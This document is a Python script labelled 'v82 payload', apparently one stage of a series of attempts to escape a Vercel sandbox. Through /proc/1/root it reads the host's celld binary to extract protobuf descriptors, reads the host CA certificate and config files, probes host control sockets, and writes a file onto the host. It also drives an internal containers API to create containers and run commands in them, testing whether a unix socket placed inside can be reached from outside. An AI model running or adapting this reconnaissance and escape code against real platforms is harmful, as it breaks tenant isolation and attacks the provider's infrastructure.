# -*- coding: utf-8 -*-
"""v82 payload: StreamOutputRequest descriptor 精确提取 + 关键文件读取 + unix socket 回连重测
v81 符号: containers.OutputStream.Number (enum!), StreamOutputRequest/Response, ContainerdRuntime, host.GetProxyCertificate
目标: (a) OutputStream 枚举值 + StreamOutputRequest 字段号 (descriptor rawDesc) (b) ca-cert.pem/runc 目录/metrics
      (c) host API socket 探测 (d) Exec unix socket 回连 + 宿主 /proc 检查"""
import socket, time, os, json, struct, re

OUT = '/vercel/sandbox/v82c.out'
SEEN = set()


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v82c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def rpc_raw(path, body=b'', ct='application/json', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ct, len(body)))
        s.sendall(req.encode() + body)
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', '', b''
        head, _, rest = data.partition(b'\r\n\r\n')
        lines = head.decode(errors='replace').split('\r\n')
        return lines[0], '\n'.join(lines[1:])[:120], rest
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, '', b''


def rpc(path, body='{}', t=3):
    st, hd, bd = rpc_raw(path, body.encode(), 'application/json', t)
    return st, bd[:600].decode(errors='replace')


def exec_cmd(ctr, cid, argv, t=6):
    body = json.dumps({"containerId": cid, "process": {"argv": argv}})
    return rpc(ctr + '/Exec', body, t=t)


def dump_seg(data, needle, win=6000, lim=40):
    """找 needle 所有出现, 打印附近可打印串"""
    for m in re.finditer(re.escape(needle), data):
        i = m.start()
        seg = data[max(0, i - win):i + win]
        strs = re.findall(rb'[\x20-\x7e]{4,}', seg)
        uniq = []
        seen = set()
        for s in strs:
            k = s[:50]
            if k in seen:
                continue
            seen.add(k)
            uniq.append(s)
        log('SEG %r @%d: %s' % (needle, i,
            ' | '.join(x.decode(errors='replace')[:60] for x in uniq[:lim])))
        return i
    log('SEG %r: NOT FOUND' % needle)
    return -1


def main():
    log('V82 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'
    R = '/proc/1/root'

    # A. celld descriptor 提取
    try:
        data = open(R + '/opt/vercel/celld', 'rb').read()
        log('celld size=%d' % len(data))
        # A1: StreamOutputRequest 附近 (descriptor rawDesc 通常包含字段名)
        dump_seg(data, b'StreamOutputRequest', 8000, 50)
        # A2: OutputStream 枚举
        dump_seg(data, b'containers.OutputStream', 4000, 30)
        # A3: 字段名 container_id/process_id 附近
        for fn in (b'container_id', b'process_id', b'containerId', b'processId'):
            dump_seg(data, fn, 3000, 25)
        # A4: 枚举值名
        for ev in (b'STDOUT', b'STDERR', b'OUTPUT_STREAM', b'Stream_STDOUT'):
            dump_seg(data, ev, 1500, 15)
        # A5: protobuf tag 计数 + 抽样
        idxs = [m.start() for m in re.finditer(rb'protobuf:"', data)]
        log('protobuf tags count=%d' % len(idxs))
        cnt = 0
        for i in idxs[:80]:
            t = data[i:i + 90]
            if b'name=' in t:
                log('TAG %r' % t)
                cnt += 1
            if cnt > 40:
                break
    except Exception as e:
        log('celld ERR %s' % e)

    # B. 关键文件
    for p in ('/run/cell/ca-cert.pem', '/run/cell/runc', '/run/metrics', '/run/apm', '/run/containerd/s'):
        try:
            st = os.stat(R + p)
            log('STAT %s size=%d mode=%o' % (p, st.st_size, st.st_mode & 0o7777))
            if st.st_mode & 0o40000:
                log('LIST %s -> %s' % (p, '; '.join(sorted(os.listdir(R + p))[:30])))
        except Exception as e:
            log('STAT %s ERR %s' % (p, e))
    for p in ('/run/cell/ca-cert.pem', '/etc/hostname', '/etc/resolv.conf'):
        try:
            d = open(R + p, 'rb').read(300)
            log('READ %s -> %r' % (p, d[:250]))
        except Exception as e:
            log('READ %s ERR %s' % (p, e))

    # C. host API socket 探测
    for sp in ('/run/cell/host.sock', '/run/cell/agent.sock', '/run/cell/control.sock',
               '/run/cell/metrics.sock', '/run/apm/apm.sock', '/run/metrics/metrics.sock',
               '/run/host.sock'):
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect(R + sp)
            log('SOCK %s CONNECT OK' % sp)
            s.close()
        except Exception as e:
            log('SOCK %s %s' % (sp, type(e).__name__))

    # D. 写测试
    try:
        open(R + '/tmp/v82_write_test.txt', 'w').write('v82 write test\n')
        log('WRITE /tmp/v82_write_test.txt OK')
    except Exception as e:
        log('WRITE ERR %s' % e)

    # E. Exec + unix socket 回连
    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('ID=%s' % (cid or 'NONE'))
    if cid:
        rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
        time.sleep(1)
        argv = ['/bin/sh', '-c',
                'rm -f /run/v82x.sock; python3 -c "import socket,os;'
                's=socket.socket(socket.AF_UNIX);s.bind(\'/run/v82x.sock\');s.listen(1);'
                'c,a=s.accept();c.send(b\'V82_UNIX_OK\');c.close();s.close();os.unlink(\'/run/v82x.sock\')" & '
                'sleep 20']
        st, bd = exec_cmd(CTR, cid, argv, t=6)
        PA = bd.split('"processId":"')[1].split('"')[0] if '"processId"' in bd else None
        log('execA unix -> %s | PA=%s' % (st, PA or bd[:120]))
        time.sleep(2)
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect('/run/v82x.sock')
            d = s.recv(100)
            log('UNIX-CONNECT OK got=%r' % d)
            s.close()
        except Exception as e:
            log('UNIX-CONNECT ERR %s' % type(e).__name__)
        log('host-run-sock: %s' % (os.path.exists('/run/v82x.sock') and 'EXISTS' or 'ABSENT'))
        rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
        log('killed')

    log('V82C_DONE')


main()
